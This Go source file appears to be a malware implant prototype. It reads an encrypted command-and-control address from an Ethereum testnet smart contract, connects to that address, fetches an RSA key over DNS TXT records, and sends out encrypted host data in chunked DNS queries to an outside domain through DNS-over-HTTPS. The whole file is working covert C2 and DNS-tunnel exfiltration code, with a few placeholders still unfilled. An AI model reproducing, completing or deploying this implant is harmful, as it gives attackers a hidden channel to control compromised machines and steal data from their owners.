package main
import (
    "io/ioutil"
    "log"
    "os"
    "net"
    "fmt"
    "bytes"
    "encoding/pem"
    "crypto/x509"
	"crypto/rsa"
    "crypto/dsa"
    "crypto/ecdsa"
    "crypto/rand"
    "crypto/sha256"
    "encoding/hex"
    "crypto/aes"
    b64 "encoding/base64"
    "github.com/dlclark/regexp2"
    b32 "encoding/base32"
    "context"
    "time"
    "strconv"
    "crypto/cipher"

	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/ethclient"
    "github.com/ethereum/go-ethereum/accounts/abi/bind"
    "github.com/tidwall/gjson"
    "github.com/likexian/gokit/xhttp"
    "strings"
    store "./ContractBuild"
)

const Hash = "UNIQUEHASH"
const SrvAddr = "127.0.0.1"
const SrvPort = "1337"
const TestNetwork = "https://endpoints.omniatech.io/v1/matic/mumbai/public"
var RSA_public_key []byte
var DNSName []byte
var sumHex string
var C2public_key string
var C2private_key string 
//type Agent struct{
//    Plataform string
//    Architecture string
//    Username string
//    Domain string
//    Process string
//}


func get_hostname() string{
    hostname, _ := os.Hostname()
    return hostname
}

func encryptCommandOutput(command string) string{
    pubPem, _ := pem.Decode(RSA_public_key)
    sum := sha256.Sum256(RSA_public_key)
    var sumHex string = hex.EncodeToString(sum[:])
    pub, err := x509.ParsePKIXPublicKey(pubPem.Bytes)
    if err != nil {
        panic("failed to parse DER encoded public key: " + err.Error())
    }

    switch pub := pub.(type) {
    case *rsa.PublicKey:
        fmt.Println("pub is of type RSA:", pub)
    case *dsa.PublicKey:
        fmt.Println("pub is of type DSA:", pub)
    case *ecdsa.PublicKey:
        fmt.Println("pub is of type ECDSA:", pub)
    default:
        panic("unknown type of public key")
    }
    key, _ := pub.(*rsa.PublicKey)
    encryptedBytes, err := rsa.EncryptOAEP(
		sha256.New(),
		rand.Reader,
		key,
		[]byte(command),
		nil)
    encryptedBytes = bytes.Trim(encryptedBytes, "\x00")
    sEnc := b32.StdEncoding.EncodeToString([]byte(encryptedBytes))
    s := fmt.Sprintf("%s|%s", string(sumHex), sEnc)
    return b32.StdEncoding.EncodeToString([]byte(s))
}

func regexp2FindAllString(re *regexp2.Regexp, s string) []string {
    var matches []string
    m, _ := re.FindStringMatch(s)
    for m != nil {
            matches = append(matches, m.String())
            m, _ = re.FindNextMatch(m)
    }
    return matches
}


func sendDNSRequest(message string, typeMSG string)([]byte){
   // client := &http.Client{}
    fmt.Println(message)
    ctx, _ := context.WithTimeout(context.Background(), 10*time.Second)
	param := xhttp.QueryParam{
		"name": message,
        "type": typeMSG,
	}
	rsp, _ := xhttp.New().Get(ctx, "https://1.1.1.1/dns-query", param, xhttp.Header{"accept": "application/dns-json"})
    buf, err := rsp.Bytes()
    if typeMSG == "TXT"{
        rsaPublicKeyPart := []string{}
        var re = regexp2.MustCompile(`(?<==)(.*?)\\`, 0)
        matches := regexp2FindAllString(re, string(buf))
        for _, ch := range matches {
            rsaPublicKeyPart = append(rsaPublicKeyPart, ch[:len(ch)-1])
        }
        var rsaPublicKeyJoined string
        rsaPublicKeyJoined = strings.Join(rsaPublicKeyPart,"")
        decodedCertificate, _ := b32.StdEncoding.DecodeString(rsaPublicKeyJoined)
        return decodedCertificate
    }
    defer rsp.Close()
    if err != nil{
        fmt.Println(err)
    }
    return buf
}

func dnsRequestEncoder(message string){
    fmt.Println("Encoding DNS request!")
    dnsmax := 255
    dnsdomainNameSize := 15
    remainSize := dnsmax-dnsdomainNameSize
    dnsList := []string{}
    domainName := ".demoni386.ninja"

    fmt.Printf("\nSize remaining for DNS request :: %d\n", remainSize)
    fmt.Printf("Size of message :: %d\n", len(message))
    fmt.Printf("Total requests needed :: %d\n", (len(message)/remainSize))
    fmt.Printf("Message blocks needed :: %d\n", (len(message) % 63))
    fmt.Printf("Message :: %s\n", string(message))
    var dnsStringJoined string
    var packetOrder int = 0

    for z, rune := range message {
        dnsStringJoined  = strings.Join(dnsList,"")
        if z % 61 == 0 && z != 0{
            dnsList = append(dnsList, ".")
        }
        if len(dnsStringJoined) >= (245 - len(domainName)){
            packetOrder = packetOrder + 1
            dnsList = append(dnsList, string("-"+strconv.Itoa(packetOrder)+"-"+strconv.Itoa(len(dnsStringJoined))+"-"))
            dnsList = append(dnsList, string(domainName))
            dnsStringJoined = strings.Join(dnsList,"")
            fmt.Println(dnsStringJoined)
            sendDNSRequest(dnsStringJoined, "A")
            dnsList = nil
            dnsStringJoined = ""
        }
        dnsList = append(dnsList, string(rune))
    }
    if dnsList != nil{
        packetOrder = packetOrder + 1
        dnsList = append(dnsList, string("-"+strconv.Itoa(packetOrder)+"-"+strconv.Itoa(len(dnsStringJoined))+"-"+"_"))
        dnsList = append(dnsList, string(domainName))
        dnsStringJoined = strings.Join(dnsList,"")
        sendDNSRequest(dnsStringJoined, "A")
        dnsList = nil
    }
}

func handleCommand(con net.Conn){
    fmt.Println("handling command!")
    dnsList := []string{}
    recvData := make([]byte, 1024)
    var debug int = 0
    for{
        con.Read(recvData)
        recvData = bytes.Trim(recvData, "\x00")

        if(len(recvData) > 0){
            fmt.Println(string(recvData))
            var test string = get_hostname()
            var command = encryptCommandOutput(test)
            if debug == 1{
                runes := []rune(command)
                for i := 1; i < len(command) ; i++ {
                    fmt.Printf("Rune %v is '%c'\n", i, string(runes[i]))
                    value := gjson.Get(string(recvData), string(runes[i]))
                    dnsList = append(dnsList, value.Str)
                }
                var dnsStringJoined string = strings.Join(dnsList, "-")
                fmt.Println(dnsStringJoined)
                dnsRequestEncoder(dnsStringJoined)
            }
            dnsRequestEncoder(command)
        }
    }
}


func generateC2RSAKeyPair()(string, *rsa.PrivateKey){
    privatekey, err := rsa.GenerateKey(rand.Reader, 2048)
    if err != nil {
        fmt.Printf("Cannot generate RSA key\n")
        os.Exit(1)
    }
    
    C2PublicKey := &privatekey.PublicKey
    publicKeyBytes, _ := x509.MarshalPKIXPublicKey(C2PublicKey)
    publicKeyBlock := pem.Block{
        Type:  "PUBLIC KEY",
        Bytes: publicKeyBytes,
    }
    publicKeyPem := string(pem.EncodeToMemory(&publicKeyBlock))
    return publicKeyPem, privatekey
}


func handleCertificate(DNSName string, con net.Conn){
    RSA_public_key = sendDNSRequest(DNSName, "TXT")
    pubPem, _ := pem.Decode(RSA_public_key)
    _, err := x509.ParsePKIXPublicKey(pubPem.Bytes)
    if err != nil{
        os.Exit(0)
    }
    sum := sha256.Sum256(RSA_public_key)
    var sumHex string = hex.EncodeToString(sum[:])

    C2public_key,_ = generateC2RSAKeyPair()
    C2CertificatePK := fmt.Sprintf("1|%s|%s", string(sumHex), b32.StdEncoding.EncodeToString([]byte(C2public_key)))
    dnsRequestEncoder(C2CertificatePK)
}

func removePadding(pt []byte) []byte {
    padLength := int(pt[len(pt)-1])
    return pt[:len(pt)-padLength]
}

func main() {
    ContractKey := []byte("SMARTCONTRACTKEY")
    
    con, _ := net.Dial("tcp", "127.0.0.1:1337")

    con.Write([]byte(Hash))
    con.(*net.TCPConn).CloseWrite()

    smartContractData, _ := ioutil.ReadAll(con)
    smartContractData = bytes.Trim(smartContractData, "\x00")
    

    smartContractAESKeyUnencoded := make([]byte, b64.StdEncoding.DecodedLen(len(ContractKey)))
    b64.StdEncoding.Decode(smartContractAESKeyUnencoded, ContractKey)
    smartContractAESKeyUnencoded = bytes.Trim(smartContractAESKeyUnencoded, "\x00")

    
    if string(smartContractData) == Hash {
        os.Exit(0)
    } else {
        con.Close()
        client, err := ethclient.Dial(TestNetwork)

        if err != nil {
            fmt.Printf("Oops! There was a problem :: %s\n", err)
        } else {
            fmt.Println("Sucess! you are connected to the Ethereum Network")
        }

        address := common.HexToAddress(string(smartContractData))
        instance, err := store.NewStore(address, client)
        if err != nil {
            fmt.Println(err)
        }
        data, err := instance.CONTRACTVARIABLENAME(&bind.CallOpts{});
        if err != nil {
            fmt.Println(err)
        }
    

        dataByte := []byte(data)
        fmt.Println(string(dataByte))
        smartContractC2IP := make([]byte, b64.StdEncoding.DecodedLen(len(data)))
        b64.StdEncoding.Decode(smartContractC2IP, dataByte)
        smartContractC2IP = bytes.Trim(smartContractC2IP, "\x00")

        iv := smartContractC2IP[:aes.BlockSize]
        fmt.Println(iv)
        ciphertext := smartContractC2IP[aes.BlockSize:]
        fmt.Println(ciphertext)
    
        block, err := aes.NewCipher(smartContractAESKeyUnencoded)
        if err != nil {
            panic(err)
        }
    
        stream := cipher.NewCFBDecrypter(block, iv)
        stream.XORKeyStream(ciphertext, ciphertext)
    
        ciphertext = removePadding(ciphertext)
    
        if err != nil {
            fmt.Printf("Oops! There was a problem :: %s\n", err)
        } else {
            fmt.Println("Sucess! you are connected to the Ethereum Network")
        }

        DNSName = ciphertext
	    fmt.Println(DNSName)
        conn, _ := net.Dial("tcp", fmt.Sprintf("%s", ciphertext))
        fmt.Println("Connection started!")
        handleCertificate(string(DNSName), conn)

    }
    con.Close()
}

func checkError(err error) {

    if err != nil {
        log.Fatal(err)
    }
}
